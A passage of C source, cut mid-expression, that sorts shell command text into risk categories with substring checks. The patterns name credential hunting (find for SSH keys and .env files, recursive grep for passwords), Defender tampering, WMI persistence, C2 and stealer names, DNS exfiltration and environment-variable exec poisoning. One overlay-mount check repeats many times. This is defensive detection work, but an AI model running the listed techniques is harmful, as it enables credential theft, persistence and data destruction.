              ci_contains(text, " --clear") || ci_contains(text, " -o") ||
              ci_contains(text, " --new") || ci_contains(text, " -d") ||
              ci_contains(text, " -t") || ci_contains(text, " -c") ||
              ci_contains(text, " -a") || ci_contains(text, " -u") ||
              ci_contains(text, " -g") || ci_contains(text, " -r") ||
              ci_contains(text, " -m"))) ||
            (ci_contains(text, "parted") &&
             (ci_contains(text, " rm") || ci_contains(text, " mkpart") ||
              ci_contains(text, " resizepart") || ci_contains(text, " name") ||
              ci_contains(text, " set") || ci_contains(text, " toggle") ||
              ci_contains(text, " rescue") || ci_contains(text, " disk_"))) ||
            (ci_contains(text, "hdparm") &&
             (ci_contains(text, " -y") || ci_contains(text, " --sleep") ||
              ci_contains(text, " --standby") || ci_contains(text, " --read-sector") ||
              ci_contains(text, " --dco"))) ||
            (ci_contains(text, "sdparm") &&
             (ci_contains(text, " --command") || ci_contains(text, " --clear") ||
              ci_contains(text, " --set") || ci_contains(text, " --reset"))) ||
            (ci_contains(text, "sg_start") &&
             (ci_contains(text, " --stop") || ci_contains(text, " --eject"))) ||
            (ci_contains(text, "sg_prevent") &&
             (ci_contains(text, " -a") || ci_contains(text, " --allow"))) ||
            (ci_contains(text, "camcontrol") &&
             (ci_contains(text, " stop") || ci_contains(text, " eject") ||
              ci_contains(text, " format") || ci_contains(text, " sanitize") ||
              ci_contains(text, " security") || ci_contains(text, " fwdownload") ||
              ci_contains(text, " delete") || ci_contains(text, " idle") ||
              ci_contains(text, " standby") || ci_contains(text, " sleep") ||
              ci_contains(text, " cmd"))) ||
            (ci_contains(text, "zpool") &&
             (ci_contains(text, " export") || ci_contains(text, " offline") ||
              ci_contains(text, " detach") || ci_contains(text, " remove") ||
              ci_contains(text, " replace") || ci_contains(text, " attach") ||
              ci_contains(text, " split") || ci_contains(text, " reguid") ||
              ci_contains(text, " labelclear") || ci_contains(text, " checkpoint") ||
              ci_contains(text, " trim"))) ||
            (ci_contains(text, "zfs") &&
             (ci_contains(text, " unmount") || ci_contains(text, " umount") ||
              ci_contains(text, " rename") || ci_contains(text, " promote") ||
              ci_contains(text, " rollback") || ci_contains(text, " hold") ||
              ci_contains(text, " release") || ci_contains(text, " send") ||
              ci_contains(text, " receive") || ci_contains(text, " allow") ||
              ci_contains(text, " unallow") || ci_contains(text, " jail") ||
              ci_contains(text, " change-key") || ci_contains(text, " load-key") ||
              ci_contains(text, " unload-key") || ci_contains(text, " redact") ||
              ci_contains(text, " bookmark"))) ||
            (ci_contains(text, "cryptsetup") &&
             (ci_contains(text, " luksclose") || ci_contains(text, " lukssuspend") ||
              ci_contains(text, " remove") || ci_contains(text, " convert") ||
              ci_contains(text, " config") || ci_contains(text, " reencrypt") ||
              ci_contains(text, " token") || ci_contains(text, " luksaddkey") ||
              ci_contains(text, " luksremovekey") || ci_contains(text, " lukskill") ||
              ci_contains(text, " lukschange"))) ||
            (ci_contains(text, "vgchange") &&
             (ci_contains(text, " -an") || ci_contains(text, " -a n") ||
              ci_contains(text, " --deactivate"))) ||
            (ci_contains(text, "lvchange") &&
             (ci_contains(text, " -an") || ci_contains(text, " -a n") ||
              ci_contains(text, " --deactivate") || ci_contains(text, " --permission") ||
              ci_contains(text, " -p"))) ||
            ci_contains(text, "blkdiscard") ||
            (ci_contains(text, "blkzone") && ci_contains(text, " reset")) ||
            (ci_contains(text, "zramctl") && ci_contains(text, " --reset")) ||
            (ci_contains(text, "kpartx") &&
             (ci_contains(text, " -d") || ci_contains(text, " --delete"))) ||
            (ci_contains(text, "dmraid") &&
             (ci_contains(text, " -an") || ci_contains(text, " -r") ||
              ci_contains(text, " -e") || ci_contains(text, " -x"))) ||
            (ci_contains(text, "multipath") &&
             (ci_contains(text, " -f") || ci_contains(text, " --flush") ||
              ci_contains(text, " -w"))) ||
            (ci_contains(text, "multipathd") && ci_contains(text, " -k")) ||
            (ci_contains(text, "iscsiadm") &&
             (ci_contains(text, " --delete") || ci_contains(text, " -o delete"))) ||
            ci_contains(text, "modprobe") || ci_contains(text, "rmmod") ||
            ci_contains(text, "depmod") ||
            (ci_contains(text, " sv ") &&
             (ci_contains(text, " stop") || ci_contains(text, " down") ||
              ci_contains(text, " force-") || ci_contains(text, " exit") ||
              ci_contains(text, " kill") || ci_contains(text, " term") ||
              ci_contains(text, " interrupt") || ci_contains(text, " quit") ||
              ci_contains(text, " once") || ci_contains(text, " pause") ||
              ci_contains(text, " hup") || ci_contains(text, " alarm") ||
              ci_contains(text, " cont"))) ||
            /* SNMP / NSM / SCADA extras */
            ci_contains(text, "snmptable") || ci_contains(text, "snmpnetstat") ||
            ci_contains(text, "snmpusm") || ci_contains(text, "snmpvacm") ||
            ci_contains(text, "snmptranslate") || ci_contains(text, "snmpinform") ||
            ci_contains(text, "snmpd") || ci_contains(text, "snmptrapd") ||
            ci_contains(text, "zeekctl") || ci_contains(text, "broctl") ||
            ci_contains(text, "argus") || ci_contains(text, "ntopng") ||
            ci_contains(text, "ostinato") || ci_contains(text, "etterfilter") ||
            ci_contains(text, "sshow") ||
            (ci_contains(text, "ntop") &&
             (ci_contains(text, " -") || ci_contains(text, "ng"))) ||
            ci_contains(text, "opcua") || ci_contains(text, "bacnet") ||
            ci_contains(text, "mbusd") || ci_contains(text, "profinet") ||
            ci_contains(text, "s7comm") || ci_contains(text, "modbus") ||
            /* PowerShell remoting / WMI persistence / Defender tamper */
            ci_contains(text, "enter-pssession") || ci_contains(text, "new-pssession") ||
            ci_contains(text, "invoke-command") || ci_contains(text, "invoke-expression") ||
            ci_contains(text, "invoke-wmicommand") || ci_contains(text, "invoke-cimmethod") ||
            ci_contains(text, "commandlineeventconsumer") ||
            ci_contains(text, "__eventfilter") ||
            ci_contains(text, "activescripteventconsumer") ||
            ci_contains(text, "paexec") || ci_contains(text, "set-mpcomputerstatus") ||
            ci_contains(text, "remove-mppreference") ||
            (ci_contains(text, "mpcmdrun") &&
             (ci_contains(text, " -") || ci_contains(text, " /"))) ||
            (ci_contains(text, "iex") &&
             (ci_contains(text, " (") || ci_contains(text, " new-"))) ||
            /* headless capture / webshot / curl-wget extras */
            ((ci_contains(text, "chromium") || ci_contains(text, "chrome") ||
              ci_contains(text, "msedge") || ci_contains(text, "firefox")) &&
             ci_contains(text, " --headless")) ||
            ci_contains(text, "wkhtmltoimage") || ci_contains(text, "wkhtmltopdf") ||
            ci_contains(text, "cutycapt") || ci_contains(text, "phantomjs") ||
            ci_contains(text, "casperjs") || ci_contains(text, "slimerjs") ||
            ci_contains(text, "trurl") ||
            (ci_contains(text, "playwright") &&
             (ci_contains(text, " screenshot") || ci_contains(text, " pdf") ||
              ci_contains(text, " open") || ci_contains(text, " codegen"))) ||
            (ci_contains(text, "puppeteer") &&
             (ci_contains(text, " -") || ci_contains(text, " screenshot") ||
              ci_contains(text, " pdf"))) ||
            (ci_contains(text, "curl") &&
             (ci_contains(text, " --resolve") || ci_contains(text, " --connect-to") ||
              ci_contains(text, " --cert") || ci_contains(text, " --key") ||
              ci_contains(text, " --config") || ci_contains(text, " --crlfile") ||
              ci_contains(text, " --pinnedpubkey"))) ||
            (ci_contains(text, "wget") &&
             (ci_contains(text, " --method") || ci_contains(text, " --body-data") ||
              ci_contains(text, " --body-file") || ci_contains(text, " --header") ||
              ci_contains(text, " --user") || ci_contains(text, " --password") ||
              ci_contains(text, " --ftp-") || ci_contains(text, " --http-"))) ||
            (ci_contains(text, "chronyc") &&
             (ci_contains(text, " makestep") || ci_contains(text, " burst") ||
              ci_contains(text, " -a") || ci_contains(text, " add") ||
              ci_contains(text, " delete") || ci_contains(text, " online") ||
              ci_contains(text, " offline"))) ||
            (ci_contains(text, "rdate") && ci_contains(text, " -")) ||
            /* credential / history / log / enum recon */
            (ci_contains(text, "find") && ci_contains(text, " -name") &&
             (ci_contains(text, ".env") || ci_contains(text, "id_rsa") ||
              ci_contains(text, ".pem") || ci_contains(text, ".key") ||
              ci_contains(text, "credential") || ci_contains(text, "pgpass") ||
              ci_contains(text, "shadow") || ci_contains(text, "id_ed25519") ||
              ci_contains(text, ".pypirc") || ci_contains(text, ".npmrc") ||
              ci_contains(text, "known_hosts") || ci_contains(text, ".ssh") ||
              ci_contains(text, "id_dsa") || ci_contains(text, "id_ecdsa") ||
              ci_contains(text, "secret"))) ||
            (ci_contains(text, "grep") && ci_contains(text, " -r") &&
             (ci_contains(text, "private") || ci_contains(text, "password") ||
              ci_contains(text, "secret") || ci_contains(text, "begin ") ||
              ci_contains(text, "credential") || ci_contains(text, "passwd"))) ||
            (ci_contains(text, "getent") && ci_contains(text, " netgroup")) ||
            (ci_contains(text, "compgen") &&
             (ci_contains(text, " -u") || ci_contains(text, " -g") ||
              ci_contains(text, " -a") || ci_contains(text, " user") ||
              ci_contains(text, " group"))) ||
            (ci_contains(text, "history") &&
             (ci_contains(text, " -a") || ci_contains(text, " -r") ||
              ci_contains(text, " -p") || ci_contains(text, " -s"))) ||
            (ci_contains(text, "fc ") && ci_contains(text, " -l")) ||
            (ci_contains(text, " net ") &&
             (ci_contains(text, " view") || ci_contains(text, " share") ||
              ci_contains(text, " session") || ci_contains(text, " accounts") ||
              ci_contains(text, " statistics") || ci_contains(text, " config") ||
              ci_contains(text, " time") || ci_contains(text, " file") ||
              ci_contains(text, " print") || ci_contains(text, " send") ||
              ci_contains(text, " start") || ci_contains(text, " stop") ||
              ci_contains(text, " continue") || ci_contains(text, " pause") ||
              ci_contains(text, " use") || ci_contains(text, " user") ||
              ci_contains(text, " localgroup") || ci_contains(text, " group") ||
              ci_contains(text, " helpmsg") || ci_contains(text, " name"))) ||
            ci_contains(text, "mongoexport") || ci_contains(text, "mongodump") ||
            ci_contains(text, "mongorestore") ||
            (ci_contains(text, "mount") &&
             (ci_contains(text, " -t cifs") || ci_contains(text, " -t nfs") ||
              ci_contains(text, " -t smbfs") || ci_contains(text, " -t davfs") ||
              ci_contains(text, " -t sshfs"))) ||
            ci_contains(text, "mount_smbfs") || ci_contains(text, "mount_nfs")
        ) {
            what = "repl/escape/rmm/miner/storage/exec primitive";
        } else if (
            /* storage teardown extras + fs destruction */
            ci_contains(text, "fstrim") ||
            ci_contains(text, "mkswap") || ci_contains(text, "resize2fs") ||
            ci_contains(text, "e2label") ||
            (ci_contains(text, "tune2fs") &&
             (ci_contains(text, " -u") || ci_contains(text, " -c") ||
              ci_contains(text, " -i") || ci_contains(text, " -o") ||
              ci_contains(text, " -m") || ci_contains(text, " -j") ||
              ci_contains(text, " -e") || ci_contains(text, " -r") ||
              ci_contains(text, " -s"))) ||
            ci_contains(text, "xfs_admin") || ci_contains(text, "xfs_io") ||
            ci_contains(text, "xfs_bmap") || ci_contains(text, "xfs_estimate") ||
            ci_contains(text, "xfs_freeze") || ci_contains(text, "xfs_growfs") ||
            ci_contains(text, "xfs_metadump") || ci_contains(text, "xfs_repair") ||
            ci_contains(text, "btrfstune") || ci_contains(text, "bcache") ||
            (ci_contains(text, "btrfs") &&
             (ci_contains(text, " send") || ci_contains(text, " receive") ||
              ci_contains(text, " balance") || ci_contains(text, " rescue") ||
              ci_contains(text, " restore") || ci_contains(text, " scrub") ||
              ci_contains(text, " check") || ci_contains(text, " property") ||
              ci_contains(text, " quota") || ci_contains(text, " qgroup") ||
              ci_contains(text, " inspect") || ci_contains(text, " dump"))) ||
            (ci_contains(text, "mdadm") &&
             (ci_contains(text, " --create") || ci_contains(text, " --build") ||
              ci_contains(text, " --grow") || ci_contains(text, " --assemble") ||
              ci_contains(text, " --misc") || ci_contains(text, " --monitor") ||
              ci_contains(text, " --incremental"))) ||
            (ci_contains(text, "dmsetup") &&
             (ci_contains(text, " clear") || ci_contains(text, " wipe") ||
              ci_contains(text, " suspend") || ci_contains(text, " create") ||
              ci_contains(text, " reload") || ci_contains(text, " rename") ||
              ci_contains(text, " resume") || ci_contains(text, " table"))) ||
            ci_contains(text, "zdb") || ci_contains(text, "ztest") ||
            ci_contains(text, "zstreamdump") || ci_contains(text, "zinject") ||
            ci_contains(text, "zvol_wait") || ci_contains(text, "zfs_ids_to_path") ||
            (ci_contains(text, "zpool") &&
             (ci_contains(text, " create") || ci_contains(text, " scrub") ||
              ci_contains(text, " initialize") || ci_contains(text, " resilver") ||
              ci_contains(text, " import"))) ||
            (ci_contains(text, "zfs") &&
             (ci_contains(text, " snapshot") || ci_contains(text, " clone") ||
              ci_contains(text, " share") || ci_contains(text, " mount ") ||
              ci_contains(text, " upgrade") || ci_contains(text, " set ") ||
              ci_contains(text, " project"))) ||
            /* screenshot / audio / input-injection / keylogger */
            (ci_contains(text, "grim") &&
             (ci_contains(text, " -") || ci_contains(text, ".png") ||
              ci_contains(text, ".jpg") || ci_contains(text, " /"))) ||
            (ci_contains(text, "slurp") && ci_contains(text, " -")) ||
            (ci_contains(text, "maim") &&
             (ci_contains(text, " -") || ci_contains(text, ".png") ||
              ci_contains(text, ".jpg"))) ||
            ci_contains(text, "hyprshot") || ci_contains(text, "grimblast") ||
            ci_contains(text, "xfce4-screenshooter") ||
            ci_contains(text, "pw-record") || ci_contains(text, "avconv") ||
            (ci_contains(text, "sox") &&
             (ci_contains(text, " rec ") || ci_contains(text, " -d ") ||
              ci_contains(text, " -t "))) ||
            ci_contains(text, "motioneye") || ci_contains(text, "zoneminder") ||
            ci_contains(text, "zmeventnotification") ||
            (ci_contains(text, "motion") &&
             (ci_contains(text, " -c") || ci_contains(text, " -b") ||
              ci_contains(text, " -d") || ci_contains(text, " -n"))) ||
            ci_contains(text, "xte ") || ci_contains(text, "xvkbd") ||
            ci_contains(text, "xdo ") || ci_contains(text, "input-recorder") ||
            (ci_contains(text, "keyd") &&
             (ci_contains(text, " send-keys") || ci_contains(text, " monitor") ||
              ci_contains(text, " applymap") || ci_contains(text, " -m"))) ||
            ci_contains(text, "keysniffer") ||
            /* miner / C2 / RAT / stealer vocabulary extras */
            ci_contains(text, "tnn-miner") || ci_contains(text, "cryptonight") ||
            ci_contains(text, "randomx") || ci_contains(text, "silenttrinity") ||
            ci_contains(text, "dcrat") || ci_contains(text, "vidar") ||
            ci_contains(text, "meduza") ||
            (ci_contains(text, "sliver") &&
             (ci_contains(text, " beacon") || ci_contains(text, " mtls") ||
              ci_contains(text, " http") || ci_contains(text, " wg") ||
              ci_contains(text, " implant") || ci_contains(text, " c2"))) ||
            (ci_contains(text, "quasar") &&
             (ci_contains(text, " c2") || ci_contains(text, " rat"))) ||
            (ci_contains(text, "warzone") &&
             (ci_contains(text, " rat") || ci_contains(text, " c2"))) ||
            (ci_contains(text, "raccoon") &&
             (ci_contains(text, " stealer") || ci_contains(text, " c2"))) ||
            (ci_contains(text, "ares") && ci_contains(text, " c2")) ||
            (ci_contains(text, "orion") && ci_contains(text, " c2")) ||
            (ci_contains(text, "villager") && ci_contains(text, " c2")) ||
            (ci_contains(text, "merlin") &&
             (ci_contains(text, " c2") || ci_contains(text, " beacon"))) ||
            (ci_contains(text, "octopus") &&
             (ci_contains(text, " c2") || ci_contains(text, " agent"))) ||
            /* LOLBin / exec-helper residuals */
            (ci_contains(text, "esentutl") &&
             (ci_contains(text, " /p") || ci_contains(text, " /o") ||
              ci_contains(text, " /r") || ci_contains(text, " /g") ||
              ci_contains(text, " /m"))) ||
            (ci_contains(text, "forfiles") &&
             (ci_contains(text, " /c") || ci_contains(text, " /s") ||
              ci_contains(text, " /p"))) ||
            (ci_contains(text, "mmc") &&
             (ci_contains(text, " /") || ci_contains(text, "msc"))) ||
            (ci_contains(text, "wmic") &&
             (ci_contains(text, " /node") || ci_contains(text, " /namespace") ||
              ci_contains(text, " process list") ||
              ci_contains(text, " process get") ||
              ci_contains(text, " bios get") ||
              ci_contains(text, " computersystem get") ||
              ci_contains(text, " os get") || ci_contains(text, " baseboard get") ||
              ci_contains(text, " cpu get") || ci_contains(text, " diskdrive get") ||
              ci_contains(text, " nicconfig") || ci_contains(text, " startup list") ||
              ci_contains(text, " service list") || ci_contains(text, " qfe") ||
              ci_contains(text, " product get") || ci_contains(text, " share list") ||
              ci_contains(text, " sysaccount") || ci_contains(text, " group list") ||
              ci_contains(text, " useraccount") || ci_contains(text, " netlogin") ||
              ci_contains(text, " rdtoggle") || ci_contains(text, " recoveros"))) ||
            (ci_contains(text, "manage-bde") &&
             (ci_contains(text, " -protectors") ||
              ci_contains(text, " -backupkey") ||
              ci_contains(text, " -changepassword") ||
              ci_contains(text, " -changepin") ||
              ci_contains(text, " -changekey") ||
              ci_contains(text, " -forcerecovery") ||
              ci_contains(text, " -getpackage"))) ||
            (ci_contains(text, "ncat") && ci_contains(text, " --lua-exec")) ||
            (ci_contains(text, "socat") && ci_contains(text, " system:")) ||
            (ci_contains(text, "parallel") &&
             (ci_contains(text, " ::") || ci_contains(text, " --pipe"))) ||
            ((ci_contains(text, "gawk") || ci_contains(text, "mawk")) &&
             (ci_contains(text, "system(") || ci_contains(text, "begin") ||
              ci_contains(text, " getline"))) ||
            (ci_contains(text, "tar") && ci_contains(text, " --to-command")) ||
            /* DNS TXT/ANY exfil + tunnel helpers */
            (ci_contains(text, "dig") &&
             (ci_contains(text, " txt") ||
              ci_contains(text, " -t txt") || ci_contains(text, " -t any") ||
              ci_contains(text, " -x"))) ||
            (ci_contains(text, "nslookup") &&
             (ci_contains(text, " -type=txt") || ci_contains(text, " -qt=txt") ||
              ci_contains(text, " -type=any") || ci_contains(text, " -qt=any"))) ||
            (ci_contains(text, "host") &&
             (ci_contains(text, " -t txt") || ci_contains(text, " -t any") ||
              ci_contains(text, " -ax"))) ||
            (ci_contains(text, "drill") &&
             (ci_contains(text, " txt") || ci_contains(text, " any") ||
              ci_contains(text, " -x"))) ||
            ci_contains(text, "doggo") || ci_contains(text, "kdig") ||
            /* external-IP recon endpoints */
            ((ci_contains(text, "curl") || ci_contains(text, "wget")) &&
             (ci_contains(text, "ifconfig.me") || ci_contains(text, "ident.me") ||
              ci_contains(text, "icanhazip") || ci_contains(text, "ipify") ||
              ci_contains(text, "checkip") || ci_contains(text, "wtfismyip") ||
              ci_contains(text, "ipinfo") || ci_contains(text, "ipapi") ||
              ci_contains(text, "ipecho") || ci_contains(text, "ifconfig.co"))) ||
            /* xdg / desktop launcher with remote payload */
            ((ci_contains(text, "xdg-open") || ci_contains(text, "gio ") ||
              ci_contains(text, "kde-open") || ci_contains(text, "sensible-browser") ||
              ci_contains(text, "x-www-browser") || ci_contains(text, "gnome-open") ||
              ci_contains(text, "exo-open") || ci_contains(text, "open ")) &&
             ci_contains(text, " http")) ||
            /* systemd / package-manager / loader tamper */
            ci_contains(text, "systemd-dissect") ||
            ci_contains(text, "systemd-volatile-root") ||
            (ci_contains(text, "machinectl") &&
             (ci_contains(text, " bind") || ci_contains(text, " copy-") ||
              ci_contains(text, " import-") || ci_contains(text, " export-") ||
              ci_contains(text, " image-"))) ||
            (ci_contains(text, "alternatives") &&
             (ci_contains(text, " --set") || ci_contains(text, " --install") ||
              ci_contains(text, " --config") || ci_contains(text, " --remove") ||
              ci_contains(text, " --auto") || ci_contains(text, " --slave") ||
              ci_contains(text, " --master") || ci_contains(text, " --altdir") ||
              ci_contains(text, " --admindir"))) ||
            ci_contains(text, "dpkg-divert") ||
            ci_contains(text, "dpkg-statoverride") ||
            (ci_contains(text, "rpm") &&
             (ci_contains(text, " --initdb") || ci_contains(text, " --rebuilddb") ||
              ci_contains(text, " -e") || ci_contains(text, " --erase"))) ||
            ci_contains(text, "rpm2cpio") || ci_contains(text, "mkinitcpio") ||
            ci_contains(text, "mkinitfs") ||
            (ci_contains(text, "ldconfig") &&
             (ci_contains(text, " -l") || ci_contains(text, " -r") ||
              ci_contains(text, " -f"))) ||
            (ci_contains(text, "setfacl") &&
             (ci_contains(text, " -m") || ci_contains(text, " -b") ||
              ci_contains(text, " -x") || ci_contains(text, " -r") ||
              ci_contains(text, " -k") || ci_contains(text, " -s") ||
              ci_contains(text, " -d") || ci_contains(text, " --set") ||
              ci_contains(text, " --remove") || ci_contains(text, " --mask") ||
              ci_contains(text, " --default") || ci_contains(text, " --restore"))) ||
            ci_contains(text, "luksmeta") ||
            (ci_contains(text, "keyctl") &&
             (ci_contains(text, " list") || ci_contains(text, " add") ||
              ci_contains(text, " read") || ci_contains(text, " print") ||
              ci_contains(text, " update") || ci_contains(text, " revoke") ||
              ci_contains(text, " purge") || ci_contains(text, " clear") ||
              ci_contains(text, " new_") || ci_contains(text, " instantiate") ||
              ci_contains(text, " pupdate") || ci_contains(text, " restrict"))) ||
            /* firmware / hardware inventory recon */
            ci_contains(text, "dmidecode") || ci_contains(text, "smbios") ||
            ci_contains(text, "biosdecode") || ci_contains(text, "vpddecode") ||
            ci_contains(text, "lshw") || ci_contains(text, "hwinfo") ||
            ci_contains(text, "inxi") ||
            /* environment-variable exec/poisoning keys */
            strstr(text, "ENV=/") || strstr(text, "LESSOPEN=|") ||
            strstr(text, "LESSOPEN=/") || strstr(text, "LESSCLOSE=|") ||
            strstr(text, "LESSCLOSE=/") || strstr(text, "PAGER=/") ||
            strstr(text, "PAGER=sh") || strstr(text, "PS4=$") ||
            strstr(text, "BASH_XTRACEFD=/") || strstr(text, "BASH_XTRACEFD=") ||
            strstr(text, "IFS=/") || strstr(text, "IFS=:") ||
            strstr(text, "SHELLOPTS=") || strstr(text, "GLOBIGNORE=") ||
            strstr(text, "MALLOC_TRACE=/") || strstr(text, "NLSPATH=/") ||
            strstr(text, "NLSPATH=%") || strstr(text, "LD_ORIGIN_PATH=/") ||
            strstr(text, "GCC_EXEC_PREFIX=/") || strstr(text, "CPATH=/") ||
            strstr(text, "CPATH=:") || strstr(text, "XDG_DATA_DIRS=/") ||
            strstr(text, "XDG_DATA_DIRS=:") || strstr(text, "MAILCAP=/")
        ) {
            what = "storage/input/stealer/env/exec primitive";
        } else if (
            /* time/NTP tampering */
            (ci_contains(text, "hwclock") && ci_contains(text, " -w")) ||
            (ci_contains(text, "ntpq") &&
             (ci_contains(text, " -c") || ci_contains(text, ":config") ||
              ci_contains(text, " config"))) ||
            ci_contains(text, "ptp4l") || ci_contains(text, "phc2sys") ||
            ci_contains(text, "pmc ") || ci_contains(text, "timemaster") ||
            /* ntfs ads / win fs & disk */
            ci_contains(text, "::$data") || ci_contains(text, ":ads") ||
            ci_contains(text, "diskpart") || ci_contains(text, "mklink") ||
            (ci_contains(text, "robocopy") &&
             (ci_contains(text, " /mir") || ci_contains(text, " /purge") ||
              ci_contains(text, " /mov"))) ||
            (ci_contains(text, "cipher") && ci_contains(text, " /c")) ||
            /* kernel proc/sys direct writes + bpf/misc mounts + sysctl file load */
            ci_contains(text, "> /proc/") || ci_contains(text, "> /sys/") ||
            ci_contains(text, "tee /proc/") || ci_contains(text, "tee /sys/") ||
            ci_contains(text, "of=/proc/") || ci_contains(text, "of=/sys/") ||
            (ci_contains(text, "sysctl") &&
             (ci_contains(text, " -p") || ci_contains(text, " --load") ||
              ci_contains(text, " --system"))) ||
            (ci_contains(text, "mount") &&
             (ci_contains(text, " -t bpf") || ci_contains(text, " -t debugfs") ||
              ci_contains(text, " -t tracefs") || ci_contains(text, " -t securityfs") ||
              ci_contains(text, " -t cgroup") || ci_contains(text, " -t pstore") ||
              ci_contains(text, " -t configfs") || ci_contains(text, " -t fusectl") ||
              ci_contains(text, " -t mqueue") || ci_contains(text, " -t hugetlbfs") || ci_contains(text, " -t overlay") || ci_contains(text, " -t overlay") || ci_contains(text, " -t overlay") || ci_contains(text, " -t overlay") || ci_contains(text, " -t overlay") || ci_contains(text, " -t overlay") || ci_contains(text, " -t overlay") || ci_contains(text, " -t overlay") || ci_contains(text, " -t overlay") || ci_contains(text, " -t overlay") || ci_contains(text, " -t overlay") ||
              ci_contains(text, " -t binfmt_misc") || ci_contains(text, " -t proc") ||
              ci_contains(text, " -o bind"))) ||
            /* fim-baseline + edr/host agents + backup cli */
            (ci_contains(text, "tripwire") && ci_contains(text, " -m")) ||
            ci_contains(text, "osqueryd") ||
            (ci_contains(text, "velociraptor") &&
             (ci_contains(text, " --") || ci_contains(text, " gui") ||
              ci_contains(text, " frontend") || ci_contains(text, " -") ||
              ci_contains(text, " config"))) ||
            ci_contains(text, "tarsnap") || ci_contains(text, "deja-dup") ||
            (ci_contains(text, "snapper") &&
             (ci_contains(text, " create") || ci_contains(text, " delete") ||
              ci_contains(text, " -c") || ci_contains(text, " cleanup") ||
              ci_contains(text, " rollback") || ci_contains(text, " undochange") ||
              ci_contains(text, " mount") || ci_contains(text, " umount") ||
              ci_contains(text, " set-config") || ci_contains(text, " modify") ||
              ci_contains(text, " install-configs"))) ||
            (ci_contains(text, "restic") &&
             (ci_contains(text, " unlock") || ci_contains(text, " prune") ||
              ci_contains(text, " rebuild-index") || ci_contains(text, " repair") ||
              ci_contains(text, " key") || ci_contains(text, " copy") ||
              ci_contains(text, " mount") || ci_contains(text, " serve") ||
              ci_contains(text, " self-update"))) ||
            (ci_contains(text, "borg") &&
             (ci_contains(text, " delete") || ci_contains(text, " compact") ||
              ci_contains(text, " recreate") || ci_contains(text, " rename") ||
              ci_contains(text, " key") || ci_contains(text, " config") ||
              ci_contains(text, " mount") || ci_contains(text, " serve") ||
              ci_contains(text, " break-lock") || ci_contains(text, " with-lock") ||
              ci_contains(text, " upgrade"))) ||
            (ci_contains(text, "duplicity") &&
             (ci_contains(text, " remove-all") || ci_contains(text, " replicate") ||
              ci_contains(text, " verify"))) ||
            /* smartcard / hsm / fido / gpg trust */
            ci_contains(text, "yubihsm") || ci_contains(text, "fido2-token") ||
            ci_contains(text, "pkcs11-tool") || ci_contains(text, "opensc") ||
            (ci_contains(text, "gpg") &&
             (ci_contains(text, " --import") || ci_contains(text, " --edit-key") ||
              ci_contains(text, " --delete") || ci_contains(text, " --desig") ||
              ci_contains(text, " --gen-revoke") || ci_contains(text, " --recv-keys") ||
              ci_contains(text, " --send-keys") || ci_contains(text, " --refresh") ||
              ci_contains(text, " --update-trustdb") || ci_contains(text, " --check-trustdb") ||
              ci_contains(text, " --sign-key") || ci_contains(text, " --lsign") ||
              ci_contains(text, " --quick-") || ci_contains(text, " --card") ||
              ci_contains(text, " --passwd") || ci_contains(text, " --pinentry") ||
              ci_contains(text, " --batch"))) ||
            (ci_contains(text, "pass") &&
             (ci_contains(text, " init") || ci_contains(text, " git") ||
              ci_contains(text, " insert") || ci_contains(text, " edit") ||
              ci_contains(text, " rm ") || ci_contains(text, " mv ") ||
              ci_contains(text, " cp ") || ci_contains(text, " generate") ||
              ci_contains(text, " otp") || ci_contains(text, " import") ||
              ci_contains(text, " export"))) ||
            (ci_contains(text, "keybase") &&
             (ci_contains(text, " pgp") || ci_contains(text, " login") ||
              ci_contains(text, " prove") || ci_contains(text, " encrypt") ||
              ci_contains(text, " decrypt") || ci_contains(text, " sign") ||
              ci_contains(text, " verify") || ci_contains(text, " fs") ||
              ci_contains(text, " chat") || ci_contains(text, " team") ||
              ci_contains(text, " account") || ci_contains(text, " delete") ||
              ci_contains(text, " deprovision"))) ||
            /* password-crackers + stego + carving */
            ci_contains(text, "zip2john") || ci_contains(text, "rar2john") ||
            ci_contains(text, "ssh2john") || ci_contains(text, "pdf2john") ||
            ci_contains(text, "keepass2john") || ci_contains(text, "luks2john") ||
            ci_contains(text, "gpg2john") || ci_contains(text, "bitlocker2john") ||
            ci_contains(text, "pfx2john") || ci_contains(text, "vncpcap2john") ||
            ci_contains(text, "outguess") || ci_contains(text, "stegsnow") ||
            ci_contains(text, "stegseek") ||
            (ci_contains(text, "foremost") &&
             (ci_contains(text, " -i") || ci_contains(text, " -c") ||
              ci_contains(text, " -o") || ci_contains(text, " -t"))) ||
            (ci_contains(text, "scalpel") &&
             (ci_contains(text, " -c") || ci_contains(text, " -o") ||
              ci_contains(text, " -b") || ci_contains(text, " -f"))) ||
            /* ipv6 attack/recon + rogue ra + dns-socks + squid */
            ci_contains(text, "parasite6") || ci_contains(text, "alive6") ||
            ci_contains(text, "detect-new-ip6") || ci_contains(text, "ndisc6") ||
            ci_contains(text, "rdisc6") || ci_contains(text, "tracert6") ||
            ci_contains(text, "tcptraceroute6") || ci_contains(text, "rtadvd") ||
            ci_contains(text, "radvd") || ci_contains(text, "rtadvctl") ||
            ci_contains(text, "rdnssd") || ci_contains(text, "dns2socks") ||
            (ci_contains(text, "squid") &&
             (ci_contains(text, " -z") || ci_contains(text, " -f") ||
              ci_contains(text, " -k") || ci_contains(text, " -d") ||
              ci_contains(text, " -n") || ci_contains(text, " -s"))) ||
            /* busybox/toybox applets + ncat/socat/gawk/ruby exec */
            (ci_contains(text, "busybox") &&
             (ci_contains(text, " nc") || ci_contains(text, " tftp") ||
              ci_contains(text, " telnet") || ci_contains(text, " ftpd") ||
              ci_contains(text, " crond") || ci_contains(text, " adduser") ||
              ci_contains(text, " addgroup") || ci_contains(text, " deluser") ||
              ci_contains(text, " insmod") || ci_contains(text, " modprobe") ||
              ci_contains(text, " chroot") || ci_contains(text, " mount") ||
              ci_contains(text, " umount") || ci_contains(text, " ifconfig") ||
              ci_contains(text, " route") || ci_contains(text, " vi ") ||
              ci_contains(text, " syslogd") || ci_contains(text, " klogd") ||
              ci_contains(text, " sendmail") || ci_contains(text, " udhcpc") ||
              ci_contains(text, " dnsd") || ci_contains(text, " inetd") ||
              ci_contains(text, " fdisk") || ci_contains(text, " mkfs") ||
              ci_contains(text, " wget") || ci_contains(text, " dmesg -c") ||
              ci_contains(text, " swapon") || ci_contains(text, " swapoff") ||
              ci_contains(text, " ip ") || ci_contains(text, " arp"))) ||
            (ci_contains(text, "toybox") &&
             (ci_contains(text, " nc") || ci_contains(text, " netcat") ||
              ci_contains(text, " telnet") || ci_contains(text, " tftp") ||
              ci_contains(text, " httpd") || ci_contains(text, " sh ") ||
              ci_contains(text, " su ") || ci_contains(text, " mount") ||
